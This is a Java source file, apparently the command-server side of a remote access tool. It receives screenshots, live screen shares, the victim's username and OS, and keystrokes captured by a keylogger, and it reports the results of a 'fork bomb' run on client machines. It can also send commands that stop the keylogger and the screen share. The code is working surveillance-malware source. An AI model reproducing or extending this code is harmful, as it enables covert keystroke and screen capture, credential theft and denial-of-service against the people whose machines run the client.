package utils;

import static utils.ServerUtils.print;

import app.Server;
import network.ClientConnection;
import network.Message;
import org.jnativehook.keyboard.NativeKeyEvent;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.InputStream;


public class ServerMessageHandler {

    private static JFrame sharedScreen;
    private static TextScreen keylogScreen;

    public static void handleIncomingMessage(Message message, ClientConnection c) {

        switch (message.getCommand()) {
            case "screen":
                receiveScreenshot(message);
                break;

            case "username":
                String name = (String) message.getArguments().get(0);
                Server.addUserSystemName(c, name);
                break;
            case "os":
                String os = (String) message.getArguments().get(0);
                Server.addUserOS(c, os);
                break;
            case "print":
                print(message.getArguments().get(0));
                break;
            case "screenshare":
                receiveScreenShare(message, c);
                break;
            case "bomb-fail":
                System.out.println("Fork Bomb failed: " + message.getArguments().get(0));
                break;
            case "key-typed":
                NativeKeyEvent keyTyped = (NativeKeyEvent) message.getArguments().get(0);
                receiveKeyTyped(keyTyped, c);
                break;
        }

    }


    static void receiveScreenShare(Message message, ClientConnection c) {
        if (sharedScreen == null) {
            sharedScreen = new JFrame("ScreenShare");
            sharedScreen.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(java.awt.event.WindowEvent e) {
                    System.out.println("Fechou o jovem");
                    e.getWindow().dispose();
                    c.getConnection().sendMessage(new Message("stop-screenshare"));
                    sharedScreen = null;
                    System.out.println("Screenshare Closed!");
                }
            });
        }

        putImageFromMessage(sharedScreen, message);
    }

    static void receiveKeyTyped(NativeKeyEvent event, ClientConnection c) {
        if(keylogScreen == null) {
            keylogScreen = new TextScreen();
            keylogScreen.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(java.awt.event.WindowEvent e) {
                    System.out.println("Fechou o jovem");
                    e.getWindow().dispose();
                    c.getConnection().sendMessage(new Message("stop-keylogger"));
                    keylogScreen = null;
                    System.out.println("Keylogger Closed!");
                }
            });
        }
        // TODO mudar
        keylogScreen.append(event.getKeyChar() + "");
    }

    static void receiveScreenshot(Message message) {
        System.out.println("SCREENZAO CHEGOU HEIN");
        JFrame window = new JFrame("ScreenShot");

        putImageFromMessage(window, message);
    }

    private static void putImageFromMessage(JFrame window, Message message) {
        try {
            byte[] imageBytes = (byte[]) message.getArguments().get(0);
            int mouseX = (int) message.getArguments().get(1);
            int mouseY = (int) message.getArguments().get(2);


            InputStream in = new ByteArrayInputStream(imageBytes);
            BufferedImage bufferedImage = ImageIO.read(in);

            ImageScreen image = new ImageScreen(bufferedImage);

            BufferedImage cursor = ImageIO.read(ResourcesUtils.getFile("cursor", "png"));

            Graphics2D graphics2D = image.getImage().createGraphics();
            graphics2D.drawImage(cursor, mouseX, mouseY, 16, 16, null);

            window.add(image);
            window.update(image.getGraphics());
//            window.pack();
//            window.setVisible(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static JFrame getSharedScreen() {
        return sharedScreen;
    }

    public static void setSharedScreen(JFrame sharedScreen) {
        ServerMessageHandler.sharedScreen = sharedScreen;
    }
}
